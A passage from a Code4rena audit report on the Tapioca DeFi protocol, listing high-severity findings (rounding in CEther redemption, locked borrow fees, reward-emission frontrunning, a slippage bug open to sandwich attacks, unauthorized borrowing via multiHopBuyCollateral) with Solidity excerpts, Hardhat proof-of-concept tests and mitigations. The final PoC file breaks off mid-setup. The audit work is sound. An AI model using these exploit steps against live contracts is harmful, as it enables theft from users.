 * @param redeemTokens The number of cTokens to redeem into underlying
 * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
 */
function redeem(uint redeemTokens) external returns (uint) {
	return redeemInternal(redeemTokens);
}
```

`redeem` returns the result from `redeemInternal`

```solidity
/**
 * @notice Sender redeems cTokens in exchange for the underlying asset
 * @dev Accrues interest whether or not the operation succeeds, unless reverted
 * @param redeemTokens The number of cTokens to redeem into underlying
 * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)
 */
function redeemInternal(uint redeemTokens) internal nonReentrant returns (uint) {
	uint error = accrueInterest();
	if (error != uint(Error.NO_ERROR)) {
		// accrueInterest emits logs on errors, but we still want to log the fact that an attempted redeem failed
		return fail(Error(error), FailureInfo.REDEEM_ACCRUE_INTEREST_FAILED);
	}
	// redeemFresh emits redeem-specific logs on errors, so we don't need to
	return redeemFresh(msg.sender, redeemTokens, 0);
}
```

After accruing interest and checking for errors, `redeemInternal` returns the result from `redeemFresh` with the amount of tokens to redeem passed as the second param.

```solidity
function redeemFresh(address payable redeemer, uint redeemTokensIn, uint redeemAmountIn) internal returns (uint) {

	...

	/* exchangeRate = invoke Exchange Rate Stored() */
	(vars.mathErr, vars.exchangeRateMantissa) = exchangeRateStoredInternal();

	...
	
	/* If redeemTokensIn > 0: */
	if (redeemTokensIn > 0) {
		/*
		 * We calculate the exchange rate and the amount of underlying to be redeemed:
		 *  redeemTokens = redeemTokensIn
		 *  redeemAmount = redeemTokensIn x exchangeRateCurrent
		 */
		vars.redeemTokens = redeemTokensIn;
	
		(vars.mathErr, vars.redeemAmount) = mulScalarTruncate(Exp({mantissa: vars.exchangeRateMantissa}), redeemTokensIn);
		if (vars.mathErr != MathError.NO_ERROR) {
			return failOpaque(Error.MATH_ERROR, FailureInfo.REDEEM_EXCHANGE_TOKENS_CALCULATION_FAILED, uint(vars.mathErr));
		}

	...

	vars.err = doTransferOut(redeemer, vars.redeemAmount);

	...

}
```

`redeemFresh` retrieves the exchange rate (the same one that `CompoundStrategy._withdraw` uses to calculate the amount to redeem), and uses it to calculate `vars.redeemAmount` which is later transferred to the `redeemer`. This is the amount of underlying ETH that we are redeeming the `CEther` tokens for.

We can carefully copy over the logic used in `CEther` to calculate the amount of underlying ETH to receive, as well as the logic used in `CompoundStrategy._withdraw` to determine how many `CEther` to redeem for the desired output amount of underlying ETH, creating the following test contract in Remix.

    pragma solidity 0.8.19;

    contract MatchCalcs {
        uint constant expScale = 1e18;
        
        struct Exp {
            uint mantissa;
        }

        function mulScalarTruncate(Exp memory a, uint scalar) pure external returns (uint) {
            return truncate(mulScalar(a, scalar));
        }

        function mulScalar(Exp memory a, uint scalar) pure internal returns (Exp memory) {
            uint256 scaledMantissa = mulUInt(a.mantissa, scalar);

            return Exp({mantissa: scaledMantissa});
        }

        function mulUInt(uint a, uint b) internal pure returns (uint) {
            if (a == 0) {
                return 0;
            }

            uint c = a * b;

            if (c / a != b) {
                return 0;
            } else {
                return c;
            }
        }

        function truncate(Exp memory exp) pure internal returns (uint) {
            // Note: We are not using careful math here as we're performing a division that cannot fail
            return exp.mantissa / expScale;
        }

        function getToWithdraw(uint256 amount, uint256 exchangeRate) pure external returns (uint) {
            return amount * (10 ** 18) / exchangeRate;
        }
    }

We run the following example with the current `exchangeRateStored` (at the time of writing) of `200877136531571418792530957` and an output amount of underlying ETH to receive of 1e18 on the function `getToWithdraw`, receiving an output of `4978167337` `CEther`. This is the amount of `CEther` that would be passed to `CEther.redeem`.

Next we can see the output amount of underlying ETH according to `CEther`s logic. We pass the same `exchangeRateStored` value and the amount of `CEther` to redeem: `4978167337`, receiving an output amount of `999999999831558306`, less than the intended amount of 1e18.

Since we receive less than intended to receive from `CEther.redeem`, the `_withdraw` call likely fails at the following check:

```solidity
require(
	wrappedNative.balanceOf(address(this)) >= amount,
	"CompoundStrategy: not enough"
);
```

### Recommended Mitigation Steps

Rather than computing an amount of `CEther` to redeem, we can instead use the `CEther.redeemUnderlying` function to receive our intended amount of underlying ETH.

**[cryptotechmaker (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/674#issuecomment-1707748630)**

***

## [[H-51] Funds are locked because borrowFee is not correctly implemented in BigBang](https://github.com/code-423n4/2023-07-tapioca-findings/issues/583)
*Submitted by [0x007](https://github.com/code-423n4/2023-07-tapioca-findings/issues/583), also found by [Koolex](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1591), [0xrugpull\_detector](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1180), [0xnev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/739), and [SaeedAlipoor01988](https://github.com/code-423n4/2023-07-tapioca-findings/issues/47)*

There's borrowOpeningFee for markets. In Singularity, this fee is accumulated over assets as a reward to asset depositors. In BigBang, assets is USD0 which would be minted and burned on borrow, and repay respectively. BigBang does not collect fees, because it uses the same mechanism as Singularity and therefore it would demand more than minted amount from user when it's time to repay.

This results in a bird and egg situation where Users can't fully repay a borrowed amount unless they borrow even more.

### Proof of Concept

Let's look at how [borrow](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L742-L767) works

```solidity
function _borrow(
    address from,
    address to,
    uint256 amount
) internal returns (uint256 part, uint256 share) {
    uint256 feeAmount = (amount * borrowOpeningFee) / FEE_PRECISION; // A flat % fee is charged for any borrow

    (totalBorrow, part) = totalBorrow.add(amount + feeAmount, true);
    require(
        totalBorrowCap == 0 || totalBorrow.elastic <= totalBorrowCap,
        "BigBang: borrow cap reached"
    );

    userBorrowPart[from] += part;

    //mint USDO
    IUSDOBase(address(asset)).mint(address(this), amount);

    //deposit borrowed amount to user
    asset.approve(address(yieldBox), amount);
    yieldBox.depositAsset(assetId, address(this), to, amount, 0);

    share = yieldBox.toShare(assetId, amount, false);

    emit LogBorrow(from, to, amount, feeAmount, part);
}
```

As can be seen above, amount would be minted to user, but the userBorrowPart is `amount + fee`. When it's time to repay, user have to return `amount + fee` in other to get all their collateral.

Assuming the user borrowed `1,000 USD0` and borrowOpeningFee is at the default value of `0.5%`. Then the user's debt would be `1,005`. If there's only 1 user, and the totalSupply is indeed `1,000`, then there's no other way for the user to get the extra `5 USD0`. Therefore he can't fully redeem his collateral and would have at least `5 * (1 + collateralizationRate) USD0` worth of collateral locked up. This fund cannot be accessed by the user, nor is it used by the protocol. It would be sitting at yieldbox forever earning yields for no one.

This issue becomes more significant when there are more users and minted amount. If more amount is minted more funds are locked.

It might seem like user Alice could go to the market to buy `5 USD0` to fully repay. But the reality is that he is transferring the unfortunate disaster to another user. Cause no matter what, Owed debts would always be higher than `totalSupply`.

This debt would keep accumulating after each mint and every burn. For example, assuming that one 1 billion of USD0 was minted and 990 million was burned in the first month. totalSupply and hence circulating supply would be 10 million, but user debts would be 15 million USD0. That's 5 million USD that can't be accessed by user nor fee collector.

### Recommended Mitigation Steps

borrowOpeningFee should not be added to userBorrowPart. If fee is to implemented, then fee collector should receive collateral or USD0 token.

**[0xRektora (Tapioca) confirmed via duplicate issue 739](https://github.com/code-423n4/2023-07-tapioca-findings/issues/739)**

***

## [[H-52] Attacker can prevent rewards from being issued to gauges for a given epoch in TapiocaOptionBroker](https://github.com/code-423n4/2023-07-tapioca-findings/issues/541)
*Submitted by [Ruhum](https://github.com/code-423n4/2023-07-tapioca-findings/issues/541), also found by [0xRobocop](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1511), [bin2chen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1306), [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1099), [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1023), [c7e7eff](https://github.com/code-423n4/2023-07-tapioca-findings/issues/875), [0xnev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/749), [glcanvas](https://github.com/code-423n4/2023-07-tapioca-findings/issues/654), [marcKn](https://github.com/code-423n4/2023-07-tapioca-findings/issues/282), and [dirk\_y](https://github.com/code-423n4/2023-07-tapioca-findings/issues/192)*

<https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/options/TapiocaOptionBroker.sol#L426> 

<https://github.com/Tapioca-DAO/tap-token-audit/blob/59749be5bc2286f0bdbf59d7ddc258ddafd49a9f/contracts/tokens/TapOFT.sol#L201>

An attacker can prevent rewards from being issued to gauges for a given epoch

### Proof of Concept

`TapOFT.emitForWeek()` is callable by anyone. The function will only return a value > 0 the first time it's called in any given week:

```sol
    ///-- Write methods --
    /// @notice Emit the TAP for the current week
    /// @return the emitted amount
    function emitForWeek() external notPaused returns (uint256) {
        require(_getChainId() == governanceChainIdentifier, "chain not valid");

        uint256 week = _timestampToWeek(block.timestamp);
        if (emissionForWeek[week] > 0) return 0;

        // Update DSO supply from last minted emissions
        dso_supply -= mintedInWeek[week - 1];

        // Compute unclaimed emission from last week and add it to the current week emission
        uint256 unclaimed = emissionForWeek[week - 1] - mintedInWeek[week - 1];
        uint256 emission = uint256(_computeEmission());
        emission += unclaimed;
        emissionForWeek[week] = emission;

        emit Emitted(week, emission);

        return emission;
    }
```

In `TapiocaOptionBroker.newEpoch()` the return value of `emitForWeek()` is used to determine the amount of tokens to distribute to the gauges. If the return value is 0, it will assign 0 reward tokens to each gauge:

```sol
    /// @notice Start a new epoch, extract TAP from the TapOFT contract,
    ///         emit it to the active singularities and get the price of TAP for the epoch.
    function newEpoch() external {
        require(
            block.timestamp >= lastEpochUpdate + EPOCH_DURATION,
            "tOB: too soon"
        );
        uint256[] memory singularities = tOLP.getSingularities();
        require(singularities.length > 0, "tOB: No active singularities");

        // Update epoch info
        lastEpochUpdate = block.timestamp;
        epoch++;

        // Extract TAP

        // @audit `emitForWeek` can be called by anyone. If it's called for a given
        // week, subsequent calls will return `0`. 
        // 
        // Attacker calls `emitForWeek` before it's executed through `newEpoch()`.
        // The call to `newEpoch()` will cause `emitForWeek` to return `0`.
        // That will prevent it from emitting any of the TAP to the gauges.
        // For that epoch, no rewards will be distributed to users.
        uint256 epochTAP = tapOFT.emitForWeek();
        _emitToGauges(epochTAP);

        // Get epoch TAP valuation
        (, epochTAPValuation) = tapOracle.get(tapOracleData);
        emit NewEpoch(epoch, epochTAP, epochTAPValuation);
    }
```

An attacker who frontruns the call to `newEpoch()` with a call to `emitForWeek()` will prevent any rewards from being distributed for a given epoch.

The reward tokens aren't lost. TapOFT will roll the missed epoch's rewards into the next one. Meaning, the gauge rewards will be delayed. The length depends on the number of times the attacker is able to frontrun the call to `newEpoch()`.

But, it will cause the distribution to be screwed. If Alice is eligible for gauge rewards until epoch x + 1 (her lock runs out), and the attacker manages to keep the attack running until x + 2, she won't be able to claim her reward tokens. They will be distributed in epoch x + 3 to all the users who have an active lock at that time.

Here's a PoC:

```typescript
// tOB.test.ts
    it.only("should fail to emit rewards to gauges if attacker frontruns", async () => {
        const {
            tOB,
            tapOFT,
            tOLP,
            sglTokenMock,
            sglTokenMockAsset,
            tapOracleMock,
            sglTokenMock2,
            sglTokenMock2Asset,
        } = await loadFixture(setupFixture);

        // Setup tOB
        await tOB.oTAPBrokerClaim();
        await tapOFT.setMinter(tOB.address);

        // No singularities
        await expect(tOB.newEpoch()).to.be.revertedWith(
            'tOB: No active singularities',
        );

        // Register sgl
        const tapPrice = BN(1e18).mul(2);
        await tapOracleMock.set(tapPrice);
        await tOLP.registerSingularity(
            sglTokenMock.address,
            sglTokenMockAsset,
            0,
        );

        await tapOFT.emitForWeek();

        await tOB.newEpoch();

        const emittedTAP = await tapOFT.getCurrentWeekEmission();

        expect(await tOB.singularityGauges(1, sglTokenMockAsset)).to.be.equal(
            emittedTAP,
        );
    })
```

Test output:

```sh
  TapiocaOptionBroker
    1) should fail to emit rewards to gauges if attacker frontruns


  0 passing (1s)
  1 failing

  1) TapiocaOptionBroker
       should fail to emit rewards to gauges if attacker frontruns:

      AssertionError: expected 0 to equal 469157964000000000000000. The numerical values of the given "ethers.BigNumber" and "ethers.BigNumber" inputs were compared, and they differed.
      + expected - actual

      -0
      +469157964000000000000000

      at Context.<anonymous> (test/oTAP/tOB.test.ts:606:73)
      at processTicksAndRejections (node:internal/process/task_queues:96:5)
      at runNextTicks (node:internal/process/task_queues:65:3)
      at listOnTimeout (node:internal/timers:528:9)
      at processTimers (node:internal/timers:502:7)

```

### Recommended Mitigation Steps

`emitForWeek()` should return the current week's emitted amount if it was already called:

```sol
    function emitForWeek() external notPaused returns (uint256) {
        require(_getChainId() == governanceChainIdentifier, "chain not valid");

        uint256 week = _timestampToWeek(block.timestamp);
        if (emissionForWeek[week] > 0) return emissionForWeek[week];
        // ...
```

**[0xRektora (Tapioca) confirmed via duplicate issue 192](https://github.com/code-423n4/2023-07-tapioca-findings/issues/192)**

**[LSDan (Judge) increase severity to High](https://github.com/code-423n4/2023-07-tapioca-findings/issues/541#issuecomment-1723509071)**

***

## [[H-53] Potential 99.5% loss in `emergencyWithdraw()` of two Yieldbox strategies](https://github.com/code-423n4/2023-07-tapioca-findings/issues/494)
*Submitted by [0xfuje](https://github.com/code-423n4/2023-07-tapioca-findings/issues/494), also found by [Madalad](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1518), [paweenp](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1412), [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/987), [kaden](https://github.com/code-423n4/2023-07-tapioca-findings/issues/965), [c7e7eff](https://github.com/code-423n4/2023-07-tapioca-findings/issues/910), [Brenzee](https://github.com/code-423n4/2023-07-tapioca-findings/issues/539), [SaeedAlipoor01988](https://github.com/code-423n4/2023-07-tapioca-findings/issues/448), and [Vagner](https://github.com/code-423n4/2023-07-tapioca-findings/issues/408)*

<https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/lido/LidoEthStrategy.sol#L108> 

<https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/convex/ConvexTricryptoStrategy.sol#L154>

99.5% of user funds are lost to slippage in two Yieldbox strategies in case of [`emergencyWithdraw()`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/convex/ConvexTricryptoStrategy.sol#L148-L156)

### Description

Slippage is incorrectly calculated where `minAmount` is intended to be 99.5%, however it's calculated to be only 0.5%, making the other 99.5% sandwichable. The usual correct `minAmount` slippage calculation in other Yieldbox strategy contracts is\
`uint256 minAmount = calcAmount - (calcAmount * 50) / 10_000;`

### Calculation logic

In [`ConvexTriCryptoStrategy`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/convex/ConvexTricryptoStrategy.sol#L154) and [`LidoEthStrategy`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/lido/LidoEthStrategy.sol#L108) - [`emergencyWithdraw()`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/convex/ConvexTricryptoStrategy.sol#L148-L156) allows the owner to withdraw all funds from the external pools. the amount withdrawn from the corresponding pool is calculated to be: [`uint256 minAmount = (calcWithdraw * 50) / 10_000;`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/convex/ConvexTricryptoStrategy.sol#L154). This is incorrect and only 0.5% of the withdrawal.

Let's calculate with `calcWithdraw = 1000` as the amount to withdrawn from the pool.
`uint256 incorrectMinAmount = (1000 * 50) / 10_000 = 5`

The correct calculation would look like this:
`uint256 correctMinAmount = calcWithdraw - (calcWithdraw * 50) / 10_000` aka
`uint256 correctMinAmount = 1000 - (1000 * 50) / 10_000 = 995`

### Withdrawal logic

[`emergencyWithdraw()`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/convex/ConvexTricryptoStrategy.sol#L148-L156) of Yieldbox Strategy contracts is meant to remove all liquidity from the corresponding strategy contract's liquidity pool.

In the case of [`LidoStrategy`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/lido/LidoEthStrategy.sol) the actual withdraw is [`curveStEthPool.exchange(1, 0, toWithdraw, minAmount)`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/lido/LidoEthStrategy.sol#L109) which directly withdraws from the Curve StEth pool.

In the case of [`ConvexTriCryptoStrategy`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/convex/ConvexTricryptoStrategy.sol) it's [`lpGetter.removeLiquidityWeth(lpBalance, minAmount)`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/convex/ConvexTricryptoStrategy.sol#L155) and lpGetter withdraws from the Curve Tri Crypto (USDT/WBTC/WETH) pool via [`removeLiquidityWeth()`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/curve/TricryptoLPGetter.sol#L142-L147) -> [`_removeLiquidity()`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/curve/TricryptoLPGetter.sol#L234-L257) -> [`liquidityPool.remove_liquidity_one_coin(_amount, _index, _min)`](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/curve/TricryptoLPGetter.sol#L246).

These transactions are vulnerable to front-running and [sandwich attacks](https://medium.com/coinmonks/defi-sandwich-attack-explain-776f6f43b2fd) so the amount withdrawn is only guaranteed to withdraw the `minAmount` aka 0.5% from the pool which makes the other 99.5% user funds likely to be lost.

### Recommended Mitigation Steps

Fix the incorrect `minAmount` calculation to be `uint256 minAmount = calcAmount - (calcAmount * 50) / 10_000;` in [ConvexTriCryptoStrategy](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/convex/ConvexTricryptoStrategy.sol#L154) and [LidoEthStrategy](https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/lido/LidoEthStrategy.sol#L108).

**[0xRektora (Tapioca) confirmed via duplicate issue 408](https://github.com/code-423n4/2023-07-tapioca-findings/issues/408)**

***

## [[H-54] Anybody can buy collateral on behalf of other users without having any allowance using the multiHopBuyCollateral()](https://github.com/code-423n4/2023-07-tapioca-findings/issues/493)
*Submitted by [0xStalin](https://github.com/code-423n4/2023-07-tapioca-findings/issues/493), also found by [peakbolt](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1195), [plainshift](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1129), [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1119), [Ack](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1087), and [rvierdiiev](https://github.com/code-423n4/2023-07-tapioca-findings/issues/121)*

*   Malicious actors can buy collateral on behalf of other users without having any allowance to do so.
*   No unauthorized entity should be allowed to take borrows on behalf of other users.

### Proof of Concept

*   The [`SGLLeverage::multiHopBuyCollateral()`](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLeverage.sol#L21-L56) function allows users to level up cross-chain: Borrow more and buy collateral with it, the function receives as parameters the account that the borrow will be credited to, the amount of collateral to add (if any), the amount that is being borrowed and a couple of other variables.

*   The `SGLLeverage::multiHopBuyCollateral()` function only calls the [`solvent()` modifier](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L120-L127), which will validate that the account is solvent at the end of the operation.

*   The `collateralAmount` variable is used to compute the required number of shares to add the specified `collateralAmount` as extra collateral to the borrower account, then there is a check to validate that the caller has enough allowance to add those shares of collateral, and if so, then the collateral is added and debited to the `from` account

```solidity
...
//add collateral
uint256 collateralShare = yieldBox.toShare(
    collateralId,
    collateralAmount,
    false
);
_allowedBorrow(from, collateralShare);
_addCollateral(from, from, false, 0, collateralShare);
...
```

*   After adding the extra collateral (if any), the [execution proceeds to call the `_borrow()` to ask for a borrow specified by the `borrowAmount` parameter, and finally calls the USDO::sendForLeverage().](https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/singularity/SGLLeverage.sol#L43-L55)

*   **The problem is that the function only validates if the caller has enough allowance for the `collateralAmount` to be added, but it doesn't check if the caller has enough allowance for the equivalent of shares of the `borrowAmount` (which is the total amount that will be borrowed!).**

*   **The exploit occurs when** a malicious actor calls the `multiHopBuyCollateral()` sending the values of the parameters as follows:
    *   `from` => The account that will buy collateral and the borrow will be credited to
    *   `collateralAmount` => **Set as 0**
    *   `borrowAmount` => **The maximum amount that the `from` account can borrow without falling into insolvency because of the borrowing**

        *   What will happen is that a malicious actor without any allowance will be able to skip the check that validates if it has enough allowance to add more collateral, and will be able to take the borrow on behalf of the `from` account, because the `borrowShare` (which represents the equivalent shares to take a borrow of `borrowAmount`) is not used to validate if the caller has enough allowance to take that amount of debt on behalf of the `from` account

### Coded a Poc

*   I used the `tapioca-bar-audit/test/singularity.test.ts` as the base for this PoC.

    *   If you'd like to use the original `tapioca-bar-audit/test/singularity.test.ts` file, just make sure to update these two lines as follow:

```solidity
diff --git a/singularity.test.ts b/singularity.test.ts.modified
index 9c82d10..9ba9c76 100755
--- a/singularity.test.ts
+++ b/singularity.test.ts.modified
@@ -3440,6 +3440,7 @@ describe('Singularity test', () => {
         it('should bounce between 2 chains', async () => {
             const {
                 deployer,
+                eoa1,
                 tap,
                 weth,
                 createTokenEmptyStrategy,
@@ -4082,7 +4083,7 @@ describe('Singularity test', () => {
                 ethers.constants.MaxUint256,
             );

-            await SGL_10.multiHopBuyCollateral(
+            await SGL_10.connect(eoa1).multiHopBuyCollateral(
                 deployer.address,
                 0,
                 bigDummyAmount,
```

*   I highly recommend to create a new test file with the below code snippet for the purpose of validating this vulnerability, ***make sure to create this file in the same folder as the `tapioca-bar-audit/test/singularity.test.ts` file***.

<details>

```solidity
import hre, { ethers } from 'hardhat';
import { BigNumberish, BytesLike, Wallet } from 'ethers';
import { expect } from 'chai';
import { BN, getSGLPermitSignature, register } from './test.utils';
import {
    loadFixture,
    takeSnapshot,
} from '@nomicfoundation/hardhat-network-helpers';
import { LiquidationQueue__factory } from '../gitsub_tapioca-sdk/src/typechain/tapioca-periphery';
import {
    ERC20Mock,
    ERC20Mock__factory,
    LZEndpointMock__factory,
    OracleMock__factory,
    UniswapV3SwapperMock__factory,
} from '../gitsub_tapioca-sdk/src/typechain/tapioca-mocks';
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import {
    BaseTOFT,
    BaseTOFTLeverageModule__factory,
    BaseTOFTMarketModule__factory,
    BaseTOFTOptionsModule__factory,
    BaseTOFTStrategyModule__factory,
    TapiocaOFT,
    TapiocaOFT__factory,
    TapiocaWrapper__factory,
} from '../gitsub_tapioca-sdk/src/typechain/tapiocaz';
import TapiocaOFTArtifact from '../gitsub_tapioca-sdk/src/artifacts/tapiocaz/TapiocaOFT.json';

describe('Singularity test', () => {
    describe('multiHopBuyCollateral()', async () => {
        const deployYieldBox = async (signer: SignerWithAddress) => {
            const uriBuilder = await (
                await ethers.getContractFactory('YieldBoxURIBuilder')
            ).deploy();

            const yieldBox = await (
                await ethers.getContractFactory('YieldBox')
            ).deploy(ethers.constants.AddressZero, uriBuilder.address);
            return { uriBuilder, yieldBox };
        };

        const deployLZEndpointMock = async (
            chainId: number,
            signer: SignerWithAddress,
        ) => {
            const LZEndpointMock = new LZEndpointMock__factory(signer);
            return await LZEndpointMock.deploy(chainId);
        };

        const deployTapiocaWrapper = async (signer: SignerWithAddress) => {
            const TapiocaWrapper = new TapiocaWrapper__factory(signer);
            return await TapiocaWrapper.deploy(signer.address);
        };

        const Tx_deployTapiocaOFT = async (
            lzEndpoint: string,
            isNative: boolean,
            erc20Address: string,
            yieldBoxAddress: string,
            hostChainID: number,
            hostChainNetworkSigner: SignerWithAddress,
        ) => {
            const erc20 = (
                await ethers.getContractAt('IERC20Metadata', erc20Address)
            ).connect(hostChainNetworkSigner);

            const erc20name = await erc20.name();
            const erc20symbol = await erc20.symbol();
            const erc20decimal = await erc20.decimals();

            // eslint-disable-next-line @typescript-eslint/ban-ts-comment
            // @ts-ignore

            const BaseTOFTLeverageModule = new BaseTOFTLeverageModule__factory(
                hostChainNetworkSigner,
            );
            const leverageModule = await BaseTOFTLeverageModule.deploy(
                lzEndpoint,
                erc20Address,
                yieldBoxAddress,
                erc20name,
                erc20symbol,
                erc20decimal,
                hostChainID,
            );

            const BaseTOFTStrategyModule = new BaseTOFTStrategyModule__factory(
                hostChainNetworkSigner,
            );
            const strategyModule = await BaseTOFTStrategyModule.deploy(
                lzEndpoint,
                erc20Address,
                yieldBoxAddress,
                erc20name,
                erc20symbol,
                erc20decimal,
                hostChainID,
            );

            const BaseTOFTMarketModule = new BaseTOFTMarketModule__factory(
                hostChainNetworkSigner,
            );
            const marketModule = await BaseTOFTMarketModule.deploy(
                lzEndpoint,
                erc20Address,
                yieldBoxAddress,
                erc20name,
                erc20symbol,
                erc20decimal,
                hostChainID,
            );

            const BaseTOFTOptionsModule = new BaseTOFTOptionsModule__factory(
                hostChainNetworkSigner,
            );
            const optionsModule = await BaseTOFTOptionsModule.deploy(
                lzEndpoint,
                erc20Address,
                yieldBoxAddress,
                erc20name,
                erc20symbol,
                erc20decimal,
                hostChainID,
            );

            const args: Parameters<TapiocaOFT__factory['deploy']> = [
                lzEndpoint,
                erc20Address,
                yieldBoxAddress,
                erc20name,
                erc20symbol,
                erc20decimal,
                hostChainID,
                leverageModule.address,
                strategyModule.address,
                marketModule.address,
                optionsModule.address,
            ];

            const TapiocaOFT = new TapiocaOFT__factory(hostChainNetworkSigner);
            const txData = TapiocaOFT.getDeployTransaction(...args)
                .data as BytesLike;

            return { txData, args };
        };

        const attachTapiocaOFT = async (
            address: string,
            signer: SignerWithAddress,
        ) => {
            const tapiocaOFT = new ethers.Contract(
                address,
                TapiocaOFTArtifact.abi,
                signer,
            );
            return tapiocaOFT.connect(signer);
        };

        const mintAndApprove = async (
            erc20Mock: ERC20Mock,
            toft: BaseTOFT,
            signer: SignerWithAddress,
            amount: BigNumberish,
        ) => {
            await erc20Mock.freeMint(amount);
            await erc20Mock.approve(toft.address, amount);
        };

        it('Attacker will take a borrow on behalf of another user without having any allowance', async () => {
            const {
                deployer,
                eoa1,
                tap,
                weth,
                createTokenEmptyStrategy,
                deployCurveStableToUsdoBidder,
                magnetar,
                createWethUsd0Singularity,
                registerBigBangMarket,
                wethUsdcOracle,
            } = await loadFixture(register);

            //Deploy LZEndpointMock
            const LZEndpointMock_chainID_0 = await deployLZEndpointMock(
                0,
                deployer,
            );
            const LZEndpointMock_chainID_10 = await deployLZEndpointMock(
                10,
                deployer,
            );

            //Deploy TapiocaWrapper
            const tapiocaWrapper_0 = await deployTapiocaWrapper(deployer);
            const tapiocaWrapper_10 = await deployTapiocaWrapper(deployer);

            //Deploy YB and Strategies
            const yieldBox0Data = await deployYieldBox(deployer);
            const YieldBox_0 = yieldBox0Data.yieldBox;

            const usdo_0_leverage = await (
                await ethers.getContractFactory('USDOLeverageModule')
            ).deploy(LZEndpointMock_chainID_0.address, YieldBox_0.address);
            const usdo_0_market = await (
                await ethers.getContractFactory('USDOMarketModule')
            ).deploy(LZEndpointMock_chainID_0.address, YieldBox_0.address);
            const usdo_0_options = await (
                await ethers.getContractFactory('USDOOptionsModule')
            ).deploy(LZEndpointMock_chainID_0.address, YieldBox_0.address);

            const USDO_0 = await (
                await ethers.getContractFactory('USDO')
            ).deploy(
                LZEndpointMock_chainID_0.address,
                YieldBox_0.address,
                deployer.address,
                usdo_0_leverage.address,
                usdo_0_market.address,
                usdo_0_options.address,
            );
            await USDO_0.deployed();

            const usdo_10_leverage = await (
                await ethers.getContractFactory('USDOLeverageModule')
            ).deploy(LZEndpointMock_chainID_10.address, YieldBox_0.address);
            const usdo_10_market = await (
                await ethers.getContractFactory('USDOMarketModule')
            ).deploy(LZEndpointMock_chainID_10.address, YieldBox_0.address);
            const usdo_10_options = await (
                await ethers.getContractFactory('USDOOptionsModule')
            ).deploy(LZEndpointMock_chainID_10.address, YieldBox_0.address);
            const USDO_10 = await (
                await ethers.getContractFactory('USDO')
            ).deploy(
                LZEndpointMock_chainID_10.address,
                YieldBox_0.address,
                deployer.address,
                usdo_10_leverage.address,
                usdo_10_market.address,
                usdo_10_options.address,
            );
            await USDO_10.deployed();

            //Deploy Penrose
            const BAR_0 = await (
                await ethers.getContractFactory('Penrose')
            ).deploy(
                YieldBox_0.address,
                tap.address,
                weth.address,
                deployer.address,
            );
            await BAR_0.deployed();
            await BAR_0.setUsdoToken(USDO_0.address);

            //Deploy ERC20Mock
            const ERC20Mock = new ERC20Mock__factory(deployer);
